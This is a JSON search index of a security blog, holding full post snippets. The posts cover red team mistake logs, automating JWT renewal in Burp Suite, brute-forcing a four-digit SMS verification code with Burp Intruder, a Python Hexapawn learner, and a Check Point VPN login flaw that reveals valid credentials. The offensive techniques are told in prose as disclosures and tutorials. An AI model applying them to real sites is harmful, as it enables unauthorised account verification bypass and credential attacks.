mistakes and the lessons taken from them. I hope that with this post I can plant the mindset I so much appreciate into people’s minds." }, { "title": "Learning from your mistakes as an offensive security professional", "url": "/posts/learning-from-your-mistakes-as-an-offensive-security-professional/", "categories": "infosec, pentest", "tags": "offensive-security, learning", "date": "2020-12-28 00:00:00 +0000", "snippet": " A team methodology for extracting the best lessons out of your worst failures.IntroductionIn both my personal and professional lives I try my best to live by a simple statement: “Your failures are the building blocks of your success”. But having a nice motivational quote means nothing if it stays only on paper (or screen). So, for a while now I had this idea of actually convert its meaning into action and the perfect opportunity had just knocked on my door.You see, last month I began a new professional challenge: to lead a red team. I’m not diving into what a red team is, but I now have a job where I must technically guide the team while planning and executing our projects and developing ourselves.Very recently me and my team mate Gustavo Viana performed a certain engagement against our company. The action lasted for about half an hour and as soon as it ended, we were approached by our manager: “I was just asked if the Red Team was doing something on our &amp;lt;service name&amp;gt;. Are you?”It was at this moment we knew: we fu….ed up.On the same day, after all the dust settled, I realized that this particular incident could be the one that would turn this old idea of mine into something actually useful: to be able to register my professional mistakes so I could really make them the building blocks of my professional success.However, now I’m not just a member of my team. I lead it. So guided by that thought, I saw that I could extend my idea to the whole team and make it a methodology.First things firstBefore I begin to walk you through the process, I have to tell you that all of this is completely useless if you can’t come forward on your own mistakes. Be humbled by the fact that you’re human, imperfect in every possible way, and you make mistakes every time. The great thing about being human, though, is that you can learn from not just your own mistakes, but from others.What to register?Well, everything you can think it’s important to detail exactly what happened, when it happened and why it went wrong. You also want to include every single technical detail about the environment, the technical and business impacts your team’s mistake created, the consequences generated, negative and positive, and, of course, the lessons learned from the event.Where to register?Personally, I use Joplin for note taking, so I just created a new notebook under my companies main notebook. Each note means one event where mistakes were made. Now, one thing I had in mind is the fact that I’m not doing that just for me, but for my whole team. So the ideal situation is if or those notes to be available for everyone on the team. My only warning here is that the notes must be stored in a safe place.The note templateBelow you can see the note template I created in Joplin with the help of my colleague:How to fill in the topics?What I recommend for the topics “Action”, “Technical details”, “Impact” and “Consequences” is that you gather as much information as possible, so you have them rich in details. This will help to remember the event in the future. Also, involve the team in the process. They can help you to grow the details and even add more information.As for the remaining topics, the most important ones, it’s highly recommended that you do a brainstorming session with the whole team (not only the members who participated in the event) so all the possible mistakes and lessons can be extracted.The methodologyAs a team leader, I’d like this methodology to be part of the team’s day to day, so everyone knows what needs to be done and why. Because of that, I came up with some rules that I think are essential for this to work as intended: All the notes and brainstorming sessions are restricted only to the team. Absolutely no names must be mentioned. The purpose here is not to register who made the mistake, but learn from it. The team leader must ensure that nobody is bullied for making a mistake. As I already said: mistakes are great opportunities for learning and they must be treated this way if you want a more mature team. So it’s your responsibility as a leader to plant that mindset seed inside the team’s head. The notes must be securely stored and accessed. This is optional: I recommend that every new member of the team go through all the existing notes, so they can see what the team has already gone through and all the good lessons they’ve learned. It’s a great way for the newcomers to also learn those lessons, but without having to make the same mistakes.Final thoughtsImagine if every team had a methodology for learning from its own mistakes. Imagine what great lessons are now lost because people think mistakes are ugly and embarrassing things that must be pushed under the carpet.It’s really great to have a way to register those tense moments and all the mistakes and the lessons taken from them. I hope that with this post I can plant the mindset I so much appreciate into people’s minds." }, { "title": "Handling Short Expiration Time of Authorization Tokens", "url": "/posts/handling-short-expiration-time-of-authorization-tokens/", "categories": "Infosec, Pentest", "tags": "web, burp-suite, authorization", "date": "2020-12-22 00:00:00 +0000", "snippet": " How not to waste precious time when testing a web applications or API’s with Burp SuiteIntroductionIn my few years doing web/API pentesting, it was the first time I had to think about how to automate the process of renewing an authorization token during the process of bruteforcing with Burp’s Intruder and when using Burp’s Repeater so I din’t have to do it manually every ten minutes, which was the expire time for the token in this scenario.Well, since I haven’t seen any blog posts on this specific scenario, I’ve decided to write one myself. Perhaps it can help folks out there struggling just like I was recently.I was actually doing a pentest on an API and it had two main endpoints: one for getting a new authorization token and the other to request some data using this token. Below you can see both requests to these endpoints:The ProblemAs you can see in the first image above, we have a very small window for interacting with the API before we need another token because of the property “expires_in” in the response body. As a matter of fact, when I tried to run Intruder for longer than ten minutes, I started to get status code 401 (unauthorized). Unfortunately when I was testing the API I didn’t have any intention of writing a blog post about this, so once I figured it out, I simply ran the attack again and all of the requests resulting in 401’s were reissued. No prints here, sorry…The First Part of the SolutionMoving on, once I realized that I had to deal with this short time frame before having to request a new token, I began to do what every good penetration tester does: begging on my knees for google to bring me a solution. Jokes apart, I knew that Burp had something for handling sessions, but I had never used it before, nor I knew where those options were. Even so, It wasn’t dificult to find them:As we can see, the descriptions are self explanatory: session handling rules define , well, rules. They’re applied every time a request within the scope for that rule is being issued. Let’s detail this area a bit more:Session Handling RulesThis session lets you create rules with predefined scope and they will be executed before every request that is in the same scope. It can be used to check the validity of a session, add cookies to the request, perform login. It’s important to note that all the rules are applied in the same order they are listed, respecting their scopes, that is, if a rule isn’t in the scope of a certain request, it will not be applied to that specific request.MacrosQuoting the very well put description: A macro is a sequence of one or more (HTTP) requests. You can use macros within session handling rules to perform tasks such as logging in to the application, obtaining anti-CSRF tokens, etc.Building the session handling ruleKnowing how these two resources work, we can now start building a session rule and a macro to renew our access token. First let’s add a new rule:In the image above we can se an area for a brief description and also what actions it will perform once it’s called. Thare’s also the scope tab, as seen below:This tab let’s you choose in what parts of Burp Suite this rule will be used, to what URL’s they can be applied, as well as restricting the rule only to requests containing custom parameters.Adding a Rule ActionOnce we defined the rule scope, let’s add an action to be performed when this rule is executed. We named the action “Check session is valid” and here is where things start to get real:Let’s break the action editor in two parts:Rule action editor: first part First the action needs to make an HTTP request as the first step to validate the session. Here I said that I want to issue the same request that is being validated, but I could also run a macro (let’s see macros in a bit) to do the same thing if it was the case. How often in terms of requests Burp will perform the session validation. In the image, we can see every 10 requests, which for this scenario is unecessary, but let’s keep this way anyway. Where to inspect the response to check if the session is valid. Here we can see “HTTP headers”, “Response body” (our case) and “URL of redirection target”. What to look when inspecting the response. In my case I had to look for the literal string “401” in the response body as this was the bahaviour i got when the token expired. Note that we can also look for regex and make the search case (in)sensitive. Lastly, for this first part, we have to indicate if a match means that the session is still valid or if it’s invalid. In my case, the literal string “401” means that the session is invalid.Rule action editor: second partThis second part is broken down in two: What happens if the session is valid/invalid: If it is valid, no other rules or actions are processed for this request. If it is invalid, I chose to run a macro, which we’ll see next. For the last part, we can update the request with parameters matched from the final macro response and/or update the request with cookies from session handling cookie jar.The Second Part of the SolutionNow, note the last checkbox in the image above. I can, after running the macro, invoke a Burp Extension action handler. What id does is pass the macro’s requests to the extension and it will do something with them.Now, can you tell me why I need an extension to be called in the first place if I have a whole system for handling sessions? Well, if you look closely, none of the requests actually have sessions because they don’t use session cookies to handle authorization. All we have is the header Authorization: Bearer with a big base64 after it, which is the actual token.So, after all this trip we can see that Burp does not have (at least not yet) a built-in process for handling this type of need: I need the contents of a header from the request to be replaced with part of the contents of the macro’s response. Good thing that Burp has this amazing capability of integrating extensions to fill in those gaps.So for this specific need, there’s this Burp extension called “Custom Parameter Handler” or CPH. What it does is “modifying HTTP messages with surgical precision, even when using macros”. More precisely for my scenario, it allows, among other things, search and replace inside requests and responses.But before we dive into the configurations of the extension, we have to see what the heck this macro thing does, because we’re going to need this knowledge soon.Configuring a macroIn the image above we can see the main window for recording and configuring a macro. As I said earlier, a macro is a group of requests that are issued in order. Also, we can pass parts of the response from a request to the next one until we have one final HTTP response. In my case, all of the requests listed here will be passed to the CPH extension.First we have to record the macro, that is, select from the proxy HTTP history tab all the requests we want to be part of the macro. In my case, it’s only the one that generates a new access token:We could, if we wanted, configure each macro request to get all the needed parameters from the responses and pass them to the next request:Although I’m not going too deep in this part, this window lets you add and use cookies from each response to the session handling cookie jar so they can be used in the next request. Also, we can specify parameters with a lot of precision. Burp will get the parameters configured here and pass them to the next request of the macro.So, now you can see that we don’t have any options for replacing header values from the macro’s response into our actual requests. That’s why we need to use the CPH extension. Let’s finally see the magic:Configuring CPH extensionLet’s break this explanation into three parts. This first will handle CPH options: The CPH tab will appear once you install the extension. In it we can see the options tab. There we can save/load or import/export a configuration and we can also set the Burp tools that the extension will work with.The second part deals with the creation of tabs:Once you selected “After running the macro, invoke a Burp extension action handler” checkbox in the last part of the Session handling action editor, a CPH tab is automatically created to handle the request of the macro. The first part of the tab let’s me name it and set the scope of use inside the URL’s that are in Burp’s scope.The third part is the magic: Here we setup a regex for searching the string to be replaced in the original request. Notice that the regex starts with “ey”. It will match exactly the access token (a JWT) that expired. The first string found by the regex in (1) will be replaced by the contents of a second regex. In this case, “\\g” refers to a named regex group called “jwt”, which we’ll see in (4). If I check the “The value I need is dynamic” box, option number four becomes available. We want to use it because every time we issue the request, a new token is generated. Finally, when the macro request is issued, this regex search is performed to extract the newly received access token. Note that I start the regex with _(?P_… Here I’m naming the regex group defined by the pair of parenthesis, which in this case match the whole token.So, the value extracted from the response by the regex (4) search is used to replace the old access token (option 2). This way I can even issue a request to the main endpoint of the API with an invalid JWT and the request will still work because in the background this extension will be working its magic.ConclusionThe conclusion here is that Burp Suite is way more powerfull than you and I can imagine. And I don’t even use its full power. And just to be clear, this post is not sponsored by PortSwigger in any way. I’m just stating a fact. They are doing a really good job with this tool." }, { "title": "Bypassing Phone Number Verification", "url": "/posts/bypassing-mobile-phone-number-verification/", "categories": "Infosec, Pentest, Web", "tags": "pentest, web", "date": "2019-04-24 12:00:00 +0000", "snippet": " In this post I’ll show you how I bypassed the phone number verification process in a website. I’m also going to explain why this was possible and what we can do to prevent this type of vulnerability.What is phone number verificationWhen you create an account in some website, sometimes they ask you to verify the phone number that you inform in the registration process. They send a SMS to the number you provided and ask you to type the code that came in that message. This way, they know that the number you informed is really yours. Doing that means that your account is now linked with an official mobile phone number, which is linked to your name. This is a form of identity verification.Why do they ask for a mobile number verificationThese verification processes allow the websites to link the accounts to real people. They do so because they want to prevent mass account creation by bots. This also helps to keep hackers from doing bad things using those accounts, because if they do, their mobile numbers are attached to their accounts, making it easier to identify them.The wrong way to implement mobile number verificationTo implement such security measure, we first have to know what are the best practices and also what are the types of attacks possible for this kind of scenario.Today it’s not difficult to find free tools that automate various types of attacks against number verification processes. Based on that, we have to keep in mind for example how many digits the codes sent via SMS must have. Today, most online banking applications use seven or eight digit codes to login to the website and even to authorize transactions.Using a four digit code today, for example, is not a secure way to verify a phone number, as we’ll see in this post. This is due to the fact that there are countless tools on the internet able to bruteforce ten thousand numbers (the number of four digit codes, from 0000 to 9999).Another thing that websites have to keep in mind is the number of wrong tries when a person submits a code. What I mean is that we have to make sure the website does not allow bruteforcing the code. This can be prevented by puting some kind of limitation when a person enters a code. One way to do that is to force the user to send a new code and invalidate the previous after a small number of wrong tries.The PoCI was creating a new account for me on a website and when I went to the account settings area, I saw that they ask to verify my phone number. I followed the process and they sent a SMS to my phone, wihch I received in just a few seconds. The code was 2161, just four digits. When I saw that, I though “well, lets verify my number AND make a poc”. The first thing that I did was to boot up my Kali and fire up Burp Suite. Burp is a tool to perform security assessments on web applications. It’s a robust tool and even in its free version, a lot can be done.Burp acts like a proxy, it stands between your browser and the web server. Doing that allows you to see all the requests that your browser generates and also the web server responses, all that before the requests/responses get to their destinations. You can also modify those requests/responses to trick the web server and sometimes bypass some security implementations.So, I used those funcions that burp provides to see how the request generated by the application after we type the code we received on the website looks like.As we can see in the image above, the last line of the request carries the number “0000”, which was the number I typed on the website in order to force it to generate and send the request to the server. The thing is that the request never got to the web server because burp was able to capture it first.The bruteforce processKnowing how the request is formed, now we can make burp send thousands of requests that look just like the original one, but with the difference that the verification code will be unique for each request. The server will receive the packages and process them, looking for the verification codes and comparing them with the correct one. If one code is wrong, the web server answers that request with an error message, and if the code is correct, it validates the phone number.To bruteforce the code, we’ll use the burp’s Intruder tab. It allows us to mark specific parts of the request to be bruteforced. The attack method we’ll use is the Sniper, which is the simplest method.The payload tab of the intruder allows us to generate a list of numbers that will be used in the attack. Each number will be put in a single request, replacing the “0000” from the original one.In the list, I chose to go from 2000 to 3000 because I already know the right code, which is 2161. This means that we only have to send 162 requests to get to the correct code. But in a real attack, burp would send 10000 requests, each one carrying one code from 0000 to 9999.When we start the attack, we can see that burp starts to send the fake requests to the server, each one with its own code.And we can also see the response from the web server, which returns an error message:So, after a while, burp sends the correct code to the server and we can see that the response is now different, a confirmation that the code works.“Your mobile number has been validated.” So we know that the server accepted my request with the right code. Going to the webpage I can see that my number is now green, meaning that it’s validated.Well, that’s it. I’ll try to contact the people responsible for the website security to inform them of my findings. I hope I was able to explain the process and the concepts behind it in an easy way. See you next time!UOLAYFIRERTRUAESBEILHIDUBGSCNOKLYFUROUSOECYACSSSTUSNOIKHOYLHOSAUEBMLOEC" }, { "title": "A Matchbox Machine that Learns", "url": "/posts/matchbox-machine-that-learns/", "categories": "Machine Learning", "tags": "machine-learning, python", "date": "2019-04-24 12:00:00 +0000", "snippet": " Hey you! So, here I am with my first post of 2019. And here, I’m going to write about a very cool thing that I learned a few weeks ago.But first the background storyI’m taking an interest in how machine learning systems work and mostly how I can apply them to data science problems. Digging up the internet on the fundamentals, I’ve found a very cool publication from 1962 where professor Martin Gardner explains how to build a machine out of matchboxes (that’s right, matchboxes) that can learn how to play a game from scratch and even master it.The process is actually very clever and it’s an adaptation of a previous experiment where a guy builds a machine with more than 300 matchboxes to play tic-tac-toe to perfection.What I didIn short, I’ve written a python code that mimics Prof. Gardner’s experiment, just like as if I was using real matchboxes. I’m taking a more technical approach here, which means that I am teaching a computer how to play and master a game.The gameThe game used to teach the machine is actually a much simpler version of chess. It’s called Hexapawn and it’s played on a 3 by 3 board of black and white squares and a total of six pawns, three for each player. They are placed on the first and last rows of the board. The moviments of the pieces are just like those of the pawns on a standard chess game: they move only forward one square at a time and they can also capture an opponent piece if it stands on one of the two diagonal squares of the next row. The exceptions are that in Hexapawn there’s no en passant move and there are no two square moves for their first movement. Also, there’s no pawn promotion.To win a game, a player must be in one of the following situations:1 - The player was able to capture all of the opponent’s pawns;2 - The player was able to move one of its pawns to the last row of the board relative to him; or3 - The player was able to make a move that leaves the opponent with no legal movement for his next move.Based on this, we now know all the information needed to play the game.How the machine learns the game? Positive and negative reinforcementsThis is the interesting part. How to make a mechanical system out of matchboxes that mimics a learning style? And how to simulate this system in a python code?First thing to explain here is the matchboxes system. According the Prof. Gardner’s publication, we need 24 matchboxes to simulate a learning computer. Each little box will represent a board state, and by that I mean every possible board configuration that the non-human player can find during a single game.So, in this system, we can draw little 3 by 3 boards on one of the faces of the matchboxes, along with the pieces of that specific board position. Also, we have to represent every single possible move that the machine can make if it is presented with this board configuration. We can use arrows for this, and each arrow must be colored with a unique color to differentiate it from the others. The reason for this is that inside each matchbox we have to put little things that also represent a specific move the machine can make, and each thing has to have the same colors as the arrows. Those “things” I’m talking about can be anything: little balls, little pieces of paper, whatever.So, after the human player makes his move, we have to pay attention to the current board state and look for the matchbox that matches that state. Once we find the right one, we shake it and take out one of the things inside, without seeing. From that we make the move corresponding to the color of the chosen thing.This repeats until the human or the machine wins the game. And here’s where the learning begins: If the machine loses the game, we have to apply negative reinforcement, which means that we will remove the thing used to make the machine’s last move, which was the one that led the its defeat. This is very important because this way we are “teaching” the machine that this specific move is bad for that specific board configuration, because we know that it leads to defeat, and thus, the machine must not play the move again if it finds itself on the same board state on future games. See what we’re doing here? We are removing all the moves that lead to defeat, so in time the machine will have only moves that doesn’t make it lose.Now, what if the machine wins a game? If this is the case, we have two different approaches. One of them maks the learning process go faster, causing the machine to master the game in fewer games played. The other one uses probability to mimic the machine’s future moves. Let’s see how they work:On the first case, if the machine wins the game, we simply take all of the things from the matchbox where the winning move was made, but the winning thing. This is because we can garantee that if the game reaches this specific board state, then there’s a move that wins the game always, so the machine doesn’t need the other ones, which means that every time that the game reaches this configuration on the board, the machine has only the winning move to make. In a short amount of games, the machine can narrow almost all of the existent moves inside the matchboxes to only those that lead to victory.For the second case, instead of removing things, we’re adding. But we’re going to add a thing that has the same color of the thing representing the winning move of the last game. This way we are increasing the probability that the machine will choose that move again in future games, despite of the fact that it will still be able to make the wrong moves even having a winning move available. This learning process is called positive reinforcement, because we are adding something to the system.The Python codeWhen I read about this machine learning game, the first thing that came to my mind was that I wanted to implement this in Python and put it in a Telegram bot. So here is the code and here is the Telegram bot. To represent the matchboxes I used a python dictionary. I came up with a system to represent the board states and the moves with numbers, and for each of the machine’s losses, I can remove the moves that cause the loss as well as all of the other moves in the case of winning (I opted not to go with the probability approach. Also, keep in mind that this choice is a negative reinforcement. I’m removing items from the system that will cause the machine to “learn” and apply this learning next time it bumps into the same situation).ConclusionWell, that’s it. This was a really fun project to make. I learned so much about the fundamentals of machine learning, and I value the fundamentals a lot! One last thing: if you found an error of any kind or just have a sugestion of improvement for this article or the python code, dont hesitate in contact me at ulisses.alves@protonmail.com. I’ll be more than happy to get a feedback from you!\\x07\\x44\\x42\\x01\\x59\\x13\\x44" }, { "title": "Credentials validation without PoC", "url": "/posts/credentials-validation/", "categories": "Infosec, Web", "tags": "infosec, web, pentest", "date": "2018-04-20 00:00:00 +0000", "snippet": " I’ve found a flaw in one of the Check Point appliances. Because I want to register a CVE, I’m required to have a public PoC explaining the vuln. So, here it is…What I discovered?Basicaly I found a way to validate credentials in the login page of the Check Point VPN appliance. By validate I mean that I can know whether a pair username:password is valid or not inside the web application without the need of authentication.How I discovered it?I was doing a pentest in a public organization in my country and I decided to do some manual enumeration in the login page of the VPN appliance. First I saw that the webapp displays an error message (Access denied - wrong user name or password) when I tried to input some random credentials:So far nothing wrong. Things started to bother me when I used some credentials I got in a phishing campaign in the login page and the webapp showed me a different message (User is unauthorized):I wasn’t able to login into the webapp, but I got a different error message than before… This is at least a weird behavior. So based on this, I tried some combinations: wrong_username:valid_password, valid_username:invalid_password, invalid_username:invalid_password. In all of these attempts I got the first error message. Only when I used a credential from the ones I got from the phishing campaign I was able to receive the second message. So, based on this, I concluded that those credentials must exist somewhere inside the appliance, in a database, but the user isn’t allowed to login.Okay, but how can a bad guy take advantage of it?That’s the simple part. Really. If an attacker is targeting a company that uses this appliance, he can build a social engineering campaign to gather as much information as possible about all of the employees and he can also create a custom wordlist using these information in order to attempt an online dictionary attack in the login page. This way he can separate all of the credentials that produce the second error message. These credentials can then be used in further attacks. In my case, I could use those credentials to gain access to the user’s webmail.ConclusionWell, that’s it. I hope I made myself clear about this Poc. I’ll update this post when my request for a CVE is answered.\\x07\\x44\\x42\\x01\\x59\\x13\\x44" } ]
